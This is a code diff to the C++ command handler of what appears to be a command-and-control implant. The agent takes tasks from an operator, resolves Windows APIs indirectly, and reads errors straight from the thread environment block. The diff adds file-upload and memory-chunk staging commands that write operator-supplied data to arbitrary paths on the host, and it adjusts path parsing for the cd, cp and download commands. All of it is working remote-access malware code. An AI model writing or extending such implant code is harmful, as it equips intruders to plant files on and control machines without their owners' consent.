@@ -40,6 +40,12 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		
 		case COMMAND_TERMINATE: break;
 		
+		case COMMAND_UPLOAD:
+			this->CmdUpload(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_SAVEMEMORY:
+			this->CmdSaveMemory(CommandId, inPacker, outPacker); break;
+
 		default: break;
 		}
 	}
@@ -48,7 +54,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pathSize = 0;
-	CHAR* path     = inPacker->UnpackStringA(&pathSize);
+	CHAR* path     = (CHAR*) inPacker->UnpackBytes(&pathSize);
 	ULONG taskId   = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
@@ -67,9 +73,9 @@ void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
 void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG srcSize = 0;
-	CHAR* src     = inPacker->UnpackStringA(&srcSize);
+	CHAR* src     = (CHAR*) inPacker->UnpackBytes(&srcSize);
 	ULONG dstSize = 0;
-	CHAR* dst     = inPacker->UnpackStringA(&dstSize);
+	CHAR* dst     = (CHAR*) inPacker->UnpackBytes(&dstSize);
 	ULONG taskId  = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
@@ -87,7 +93,7 @@ void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
 void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG filenameSize = 0;
-	CHAR* filename     = inPacker->UnpackStringA(&filenameSize);
+	CHAR* filename     = (CHAR*) inPacker->UnpackBytes(&filenameSize);
 	ULONG taskId       = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
@@ -191,4 +197,59 @@ void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
 	}
+}
+
+void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG memoryId = inPacker->Unpack32();
+	ULONG pathSize = 0;
+	CHAR* path     = (CHAR*)inPacker->UnpackBytes(&pathSize);
+	ULONG taskId   = inPacker->Unpack32();
+	
+	outPacker->Pack32(taskId);
+
+	if ( !agent->memorysaver->chunks.contains(memoryId) )
+		return;
+
+	MemoryData memData = agent->memorysaver->chunks[memoryId];
+	if (memData.complete) {
+
+		bool  result  = false;
+		DWORD written = 0;
+
+		HANDLE hFile = ApiWin->CreateFile(path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile && hFile != INVALID_HANDLE_VALUE)
+			result = ApiWin->WriteFile(hFile, memData.buffer, memData.totalSize, &written, NULL);
+
+		if (result) {
+			outPacker->Pack32(COMMAND_UPLOAD);
+		}
+		else {
+			outPacker->Pack32(COMMAND_ERROR);
+			outPacker->Pack32(TEB->LastErrorValue);
+		}
+
+		if (hFile) {
+			ApiNt->NtClose(hFile);
+			hFile = NULL;
+		}
+	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(2);
+	}
+	agent->memorysaver->RemoveMemoryData(memoryId);
+}
+
+
+
+void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG memoryId   = inPacker->Unpack32();
+	ULONG totalSize  = inPacker->Unpack32();
+	ULONG bufferSize = 0;
+	BYTE* buffer     = inPacker->UnpackBytes(&bufferSize);
+	ULONG taskId     = inPacker->Unpack32();
+
+	this->agent->memorysaver->WriteMemoryData(memoryId, totalSize, bufferSize, buffer);
 }
